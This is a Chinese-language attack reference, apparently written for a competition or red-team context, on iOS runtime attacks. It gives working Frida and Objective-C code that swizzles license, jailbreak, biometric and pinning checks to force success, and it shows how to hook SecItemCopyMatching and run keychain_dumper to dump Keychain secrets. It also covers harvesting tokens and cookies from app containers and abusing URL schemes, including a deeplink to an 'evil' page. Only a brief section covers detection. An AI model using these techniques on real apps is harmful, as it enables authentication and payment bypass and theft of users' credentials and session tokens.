# iOS 运行时攻击：方法交换、任意调用、Keychain 与容器

> 被 `competition-ios-runtime` 引用。核心是：**在已能注入的前提下，如何用 runtime 能力
> 精确触达信任边界**——不是把 app 搞崩，而是让它替你把校验通过。

## 一、攻击面总览（按可利用性排序）

| 面 | 入口 | 可控程度 | 典型收益 |
| --- | --- | --- | --- |
| ObjC 方法交换 | 任意已加载类 | **高**（替换实现） | 绕过校验、伪造返回值 |
| 动态调用任意方法 | `NSClassFromString` + `performSelector` | 高 | 调私有 API |
| Keychain | `SecItemCopyMatching` | 中（受 access group 限） | 拿 token/密码 |
| 应用容器 | `/var/mobile/Containers/Data/Application/<UUID>/` | 高（越狱机） | 读本地 DB/prefs/缓存 |
| URL Scheme | `openURL:` | 中 | 跨 app 触发逻辑 |
| Universal Link | `associated-domains` | 中 | 劫持/绕过校验 |
| 扩展（extension）/ App Group | 共享容器 | 中 | 跨进程读数据 |
| 网络层 | `NSURLSession` hook | 高 | 明文/改包 |

## 二、ObjC 方法交换（method swizzling）

### 2.1 原理

```
method_exchangeImplementations(m1, m2)
  → 交换 method_t 里的 imp 指针
  → 之后调用 [obj sel] 会跑到 m2 的实现
  → 在 m2 里调"自己"（其实是 m1）实现原逻辑再改返回值
```

```objc
// 传统 swizzle（在自己的 dylib/tweak 里）
#import <objc/runtime.h>

static IMP orig_verify;
static BOOL my_verify(id self, SEL _cmd) {
    return YES;                       // 直接放行
}

__attribute__((constructor))
static void init(void) {
    Class cls = objc_getClass("LicenseChecker");
    Method m = class_getInstanceMethod(cls, @selector(verify));
    orig_verify = method_getImplementation(m);
    method_setImplementation(m, (IMP)my_verify);
}
```

```javascript
// Frida 版（不改包，最常用）
if (ObjC.available) {
  var cls = ObjC.classes.LicenseChecker;
  var sel = "- verify";
  var orig = cls[sel].implementation;
  Interceptor.replace(orig, new NativeCallback(function (self, _cmd) {
    console.log("[swizzle] verify -> YES");
    return 1;                          // BOOL: 1 = YES
  }, 'bool', ['pointer', 'pointer']));
}

// 更安全的写法：调原实现再决定
Interceptor.attach(cls["- verify"].implementation, {
  onLeave(ret) {
    if (!ret) {                        // 原本返回 NO
      console.log("[swizzle] force YES");
      ret.replace(ptr(1));
    }
  }
});
```

### 2.2 参数与返回类型的坑

| 场景 | 坑 | 正确做法 |
| --- | --- | --- |
| `BOOL` 返回 | iOS 的 `BOOL` 在 arm64 是 `bool`（1 字节），但旧代码可能按 `int` 处理 | `NativeCallback(..., 'bool', ...)`，返回 1 |
| 带参数方法 | selector 的冒号个数 = 参数个数（+ self/_cmd） | `"- doThing:with:"` → args = [self, _cmd, a, b] |
| 结构体返回 | 通过隐藏指针返回（x8） | 需要按 ABI 处理，建议别 replace |
| `id` 返回 | 返回 ObjC 对象指针 | 返回 `ptr(0)` = nil，可能 NPE |
| block 参数 | 是 ObjC 对象（block 指针） | 需要 `ObjC.Object` 包装后调用 |

```javascript
// 枚举类的所有方法（不知道 selector 时）
if (ObjC.available) {
  var methods = ObjC.classes.TargetCrypto.$ownMethods;
  methods.forEach(function (m) { console.log(m); });
  // 输出形如 "- encrypt:key:" / "+ sharedInstance"
}
```

```javascript
// 枚举所有类（找目标类）
if (ObjC.available) {
  Object.keys(ObjC.classes).forEach(function (name) {
    if (/crypto|auth|check|sign/i.test(name)) console.log(name);
  });
}
```

### 2.3 典型攻击目标清单

| 目标 | selector 模式 | 攻击点 |
| --- | --- | --- |
| 越狱检测 | `isJailbroken` / `checkJailbreak` | 返 true/false 反转 |
| 签名校验 | `verifySignature:` / `checkSign` | 强制通过 |
| 证书 pinning | `URLSession:didReceiveAuthenticationChallenge:` | 用默认凭证 |
| 设备绑定 | `deviceId` / `getUDID` | 返回已知值 |
| 生物认证 | `evaluatePolicy:localizedReason:reply:` | 直接回调 success |
| 付费墙 | `isPremium` / `hasPurchased` | 返 true |
| Root/调试检测 | `isDebuggerAttached` | 返 false |
| 加密入口 | `encryptData:` / `decryptData:` | 打明文和密钥 |

## 三、动态调用任意方法

```javascript
// 1) 按类名取类（即使类不在头文件里）
if (ObjC.available) {
  var C = ObjC.classes["SecretManager"];
  var inst = C.alloc().init();
  // 传字符串参数（注意用 NSString，不是 JS string）
  var arg = ObjC.classes.NSString.stringWithString_("input");
  var r = inst["- decrypt:"](arg);
  console.log(r.toString());

  // 类方法
  console.log(ObjC.classes.SecretManager["+ sharedKey"]().toString());
}
```

```javascript
// 2) 处理返回的对象/数组
var arr = ObjC.classes.NSArray.arrayWithObjects_(a, b, nil);
console.log(arr.count().valueOf());
for (var i = 0; i < arr.count(); i = i + 1) {
  console.log(arr.objectAtIndex_(i).toString());
}

// 3) 调 block（异步 API 常常要传 block）
var blk = new ObjC.Block({
  retType: 'void',
  argTypes: ['object', 'object'],
  implementation: function (success, err) {
    console.log("callback success=" + success + " err=" + err);
  }
});
inst["- evaluatePolicy:reply:"](0, blk);
```

```javascript
// 4) 读/写属性（KVC）
var obj = ObjC.classes.Settings.sharedInstance();
console.log(obj.valueForKey_("apiKey").toString());
obj.setValue_forKey_(ObjC.classes.NSString.stringWithString_("fake"), "apiKey");
```

| 需求 | API |
| --- | --- |
| 类是否存在 | `ObjC.classes["X"] !== undefined` |
| 取所有方法 | `cls.$ownMethods` |
| 取所有 ivar | `cls.$ownIvars` |
| 取父类 | `cls.$superClass` |
| 判断是否 respond | `obj.respondsToSelector_(sel)` |
| 字符串转换 | `ObjC.Object.toString()` |

## 四、Keychain 访问

### 4.1 结构

```
kSecClassGenericPassword (genp):
  kSecAttrAccount (acct)   ← 账号
  kSecAttrService (svce)   ← 服务名
  kSecAttrAccessGroup      ← 访问组（决定谁能读）
  kSecValueData (data)     ← 加密后的值
kSecClassInternetPassword (inet):
  额外有 protocol/server/port/path
```

### 4.2 攻击路径

| 路径 | 前提 | 做法 |
| --- | --- | --- |
| App 自己读 | 已注入进程内 | hook `SecItemCopyMatching` 看 query 与结果 |
| 跨 app 读 | 有 access group entitlement | 用 `keychain_dumper`（带 entitlements） |
| 直接读 db | 越狱 + 解 keychain | `keychain-2.db` 的 `data` 需 class key 解密 |
| 伪造读取 | 注入到目标 app | 直接调 `SecItemCopyMatching` 用该 app 的 group |

```javascript
// hook SecItemCopyMatching 看明文（最实用）
var Sec = Module.load("/System/Library/Frameworks/Security.framework/Security");
var copyMatching = Sec.findExportByName("SecItemCopyMatching");
Interceptor.attach(copyMatching, {
  onEnter(args) {
    this.query = args[0];
    this.result = args[1];
  },
  onLeave(ret) {
    if (ret.toInt32() === 0) {         // errSecSuccess = 0
      try {
        var res = new ObjC.Object(this.result.readPointer());
        console.log("[Keychain] " + res.toString());
      } catch (e) {}
    }
  }
});
```

```bash
# keychain_dumper（越狱机，需带 entitlement 签名）
# 1) 给二进制加 entitlement
cat > ent.plist <<'EOF'
<plist><dict>
<key>keychain-access-groups</key><array><string>*</string></array>
</dict></plist>
EOF
ldid -Sent.plist keychain_dumper
# 2) 推到设备运行
scp keychain_dumper root@device:/tmp/
ssh root@device "/tmp/keychain_dumper -a"      # -a = 全部 group
```

```bash
# 直接看 db（拿不到明文的 data，但能看到条目）
sqlite3 /var/mobile/Library/Keychains/keychain-2.db \
  "select rowid, acct, svce from genp;"
# data 是加密的；需要 class key（在 keybag 里）
```

## 五、应用沙箱与容器结构

```bash
# 越狱机上的路径（iOS 15+）
/var/mobile/Containers/Data/Application/<UUID>/
├── Documents/           ← 用户数据（iTunes 备份包含）
├── Library/
│   ├── Preferences/<bundleid>.plist   ← NSUserDefaults（★ 最常见配置）
│   ├── Caches/                        ← 缓存（含网络响应、图片）
│   ├── Application Support/           ← 数据库、SDK 数据
│   └── SplashBoard/
└── tmp/

# 找到目标 app 的 UUID
find /var/mobile/Containers/Data/Application -name "*.plist" -path "*Preferences*" 2>/dev/null | grep <bundleid>
# 或
ls -d /var/mobile/Containers/Data/Application/*/  | while read d; do
  [ -f "$d/.com.apple.mobile_container_manager.metadata.plist" ] && \
  plutil -p "$d/.com.apple.mobile_container_manager.plist" 2>/dev/null | grep -q "<bundleid>" && echo "$d"
done
```

| 位置 | 内容 | 取证价值 |
| --- | --- | --- |
| `Library/Preferences/*.plist` | NSUserDefaults | 最常有 token/userid/开关 |
| `Library/Application Support/` | sqlite/Realm/CoreData | 业务数据 |
| `Library/Caches/` | HTTP 缓存、图片 | 曾有 API 响应残留 token |
| `Documents/` | 用户文件、导出 | 附件/日志 |
| `tmp/` | 临时 | 有时有 dump/日志 |
| `Library/Cookies/` | `Cookies.binarycookies` | 会话 |
| App Group 容器 | `/var/mobile/Containers/Shared/AppGroup/<UUID>/` | 主 app 与扩展共享 |

```bash
# 常用读取
plutil -p .../Library/Preferences/com.target.app.plist
sqlite3 .../Library/Application\ Support/data.db ".tables"
strings .../Library/Caches/*.cache | grep -i token

# binarycookies 解析
python3 -m pip install binarycookies
python3 -c "from binarycookies import BinaryCookieJar as J; \
  [print(c.name, c.value) for c in J.load('Cookies.binarycookies')]"
```

## 六、URL Scheme 与 Universal Link 劫持

### 6.1 URL Scheme

```bash
# 从 Info.plist 看注册了哪些 scheme
plutil -p "$APP/Info.plist" | grep -A20 CFBundleURLTypes
```

```javascript
// 触发（在目标 app 内）
var url = ObjC.classes.NSURL.URLWithString_("targetapp://reset?token=abc");
ObjC.classes.UIApplication.sharedApplication()["- openURL:options:completionHandler:"](url, nil, nil);
```

| 攻击点 | 说明 |
| --- | --- |
| 参数注入 | `scheme://action?param=` 里参数未校验 → 越权操作 |
| 回调劫持 | 自定义 scheme 可被**任何 app** 注册（iOS 会冲突） |
| 深度链接绕过 | `scheme://webview?url=https://evil` → 加载任意页面 |
| 认证绕过 | `scheme://login?token=` 直接登录 |

```bash
# 从外部触发
xcrun simctl openurl booted "targetapp://action?x=1"
# 真机
# 用 Safari 输入 scheme，或用另一 app 调 openURL
```

### 6.2 Universal Link

```bash
# 看关联域名
plutil -p "$APP/Info.plist" | grep -A5 "com.apple.developer.associated-domains"
# 服务端必须有 /.well-known/apple-app-site-association
curl -s https://api.target.com/.well-known/apple-app-site-association | jq .
```

| 攻击面 | 说明 |
| --- | --- |
| AASA 配置错误 | `paths: ["*"]` 或 `components` 过宽 → 任何路径都进 app |
| 跨域跳转 | Universal Link 落到 app 后 app 内再打开 webview |
| 参数丢失 | 某些实现不校验 `_escaped_fragment_` |

## 七、其他运行时技巧

| 目的 | 做法 |
| --- | --- |
| 绕过 `PT_DENY_ATTACH` | replace `ptrace` 返回 0 |
| 绕过 `sysctl` 调试检测 | hook `sysctl`，清 `P_TRACED` 标志 |
| 伪造设备 ID | hook `identifierForVendor` / `UIDevice` 属性 |
| 绕过生物认证 | hook `LAContext` 的 `evaluatePolicy` 回调 success=YES |
| 关闭证书校验 | hook `NSURLSession` 的 `didReceiveChallenge`，用 `NSURLSessionAuthChallengeUseCredential` + 空凭证 |
| 读任意文件 | 用 app 的沙箱权限（越权路径拼接） |
| 改 UI 逻辑 | swizzle `UIViewController viewDidLoad` 注入 |

```javascript
// 绕过证书校验（NSURLSession delegate）
if (ObjC.available) {
  var NSURLSession = ObjC.classes.NSURLSession;
  // 更常用：hook 整个类的 delegate 方法
  var Deleg = ObjC.classes["MySessionDelegate"];   // 需先找到实际 delegate 类
  // 或全局：hook Security 层的 SSL 校验（见 anti-detection-bypass.md）
}
```

```javascript
// 伪造 IDFV
Interceptor.attach(ObjC.classes.UIDevice["- identifierForVendor"].implementation, {
  onLeave(ret) {
    var uuid = ObjC.classes.NSUUID.alloc().initWithUUIDString_(
      "00000000-0000-0000-0000-000000000001");
    ret.replace(uuid);
  }
});
```

## 八、检测视角（防守方）

| 红队动作 | App/服务端信号 |
| --- | --- |
| swizzle | `method_getImplementation` 与镜像不一致（完整性自检可发现） |
| 动态调用私有方法 | 无直接日志；但异常调用序列可被埋点 |
| Keychain 读取 | `SecItemCopyMatching` 调用频率突增（可自埋点） |
| 容器读写 | 无（文件系统层），但越权访问会触发 sandbox deny 日志 |
| URL scheme 触发 | app 内 deeplink 埋点；来源 app 未知 |
| 生物认证绕过 | 服务端有独立的设备可信度判断 |
| 修改请求 | TLS 指纹/序列号/时间戳异常 |

## 九、验伤信号

| 声称 | 证据 |
| --- | --- |
| "swizzle 生效" | 原逻辑不再执行（原本会弹的校验失败提示消失）+ 业务请求被服务端接受 |
| "拿到 Keychain 明文" | 具体条目 `acct`/`svce`/`data` 三件套，且能用于后续请求 |
| "容器里找到 token" | 文件路径 + 完整字段 + 用该 token 发出的请求成功 |
| "绕过 pinning" | 抓到明文 HTTPS body（不是只有 CONNECT） |

**反例（看起来成功其实是假）**：

- swizzle 后 app 不崩但功能异常 → 返回类型错（`BOOL` 用了 `int`）
- Keychain hook 有输出但 `data` 是 `<null>` → access group 不匹配，读到的是别人的条目
- 改了 plist 但行为不变 → app 启动时从服务端拉配置覆盖了本地
- deeplink 打开了页面但没越权 → 服务端还有二次鉴权

## 十、常见坑

1. **selector 写错冒号**——`- doThing:` 与 `- doThing:with:` 是两个不同方法，
   写错会 `unrecognized selector` 崩溃。
2. **BOOL 返回类型**——arm64 上 `BOOL` 是 `bool`（1 字节），
   用 `'int'` 会在高位留下垃圾 → 判断为真但行为诡异。
3. **`ObjC.classes.X` 为 undefined**——类还没加载（懒加载），
   要 `ObjC.classes` 延迟枚举或触发后再取。
4. **主线程问题**——UI 相关调用必须在主线程，
   Frida 的 JS 线程调 UI API 会崩（用 `ObjC.schedule(ObjC.mainQueue, fn)`）。
5. **Swift-only 类**——没有 ObjC 元数据，`ObjC.classes` 里找不到；
   要用 `$s` 符号 + 直接地址 hook（见 `ios-reverse-guide.md` §五）。
6. **容器路径找错**——多个 UUID 目录，要按 `.com.apple.mobile_container_manager.metadata.plist`
   的 bundleid 匹配，不能只看最新修改时间。
7. **改 plist 被覆盖**——`NSUserDefaults` 有缓存，改文件后要 `killall -9` app，
   且有些值每次启动从 Keychain/服务端同步。